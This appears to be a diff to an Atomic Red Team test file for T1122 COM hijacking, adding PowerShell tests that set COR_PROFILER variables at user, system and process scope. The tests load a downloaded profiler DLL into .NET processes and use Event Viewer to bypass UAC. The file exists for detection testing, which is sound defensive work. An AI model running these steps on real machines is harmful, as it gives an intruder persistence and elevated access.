@@ -3,16 +3,16 @@ attack_technique: T1122
 display_name: Component Object Model (COM) Hijacking
 
 atomic_tests:
-- name: COM Hijack Leveraging .NET profiler DLL
+- name: COM Hijack Leveraging user scope COR_PROFILER
   description: |
-    Creates environment variables and CLSID to enable a .NET profiler. The profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by the Event Viewer process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. 
+    Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER). The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by the Event Viewer process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. 
 
   supported_platforms:
     - windows
 
   input_arguments:
     file_name:
-      description: profiler DLL
+      description: unmanaged profiler DLL
       type: Path
       default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
     clsid_guid:
@@ -41,10 +41,91 @@ atomic_tests:
       New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
       Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
       START MMC.EXE EVENTVWR.MSC
-      Start-Sleep 5
     cleanup_command: |
       Write-Host "Removing registry keys" -ForegroundColor Cyan
       Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
       Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
       Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
       Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+
+- name: COM Hijack Leveraging System Scope COR_PROFILER
+  description: |
+    Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. 
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    file_name:
+      description: unmanaged profiler DLL
+      type: Path
+      default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+    clsid_guid:
+      description: custom clsid guid
+      type: String
+      default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        #{file_name} must be present
+      prereq_command: | # commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the pre-requisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
+        if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      get_prereq_command: | 
+        New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "Creating system environment variables" -ForegroundColor Cyan
+      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+    cleanup_command: |
+      Write-Host "Removing system environment variables" -ForegroundColor Cyan
+      Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
+      Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
+      Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+
+- name: COM Hijack Leveraging registry-free process scope COR_PROFILER
+  description: |
+    Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by PowerShell.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    file_name:
+      description: unamanged profiler DLL
+      type: Path
+      default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+    clsid_guid:
+      description: custom clsid guid
+      type: String
+      default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        #{file_name} must be present
+      prereq_command: | # commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the pre-requisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
+        if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      get_prereq_command: | 
+        New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $env:COR_ENABLE_PROFILING = 1
+      $env:COR_PROFILER = '#{clsid_guid}'
+      $env:COR_PROFILER_PATH = '#{file_name}'
+      POWERSHELL -c 'Start-Sleep 1'
+    cleanup_command: |
+      $env:COR_ENABLE_PROFILING = 0
+      $env:COR_PROFILER = ''
+      $env:COR_PROFILER_PATH = ''
+
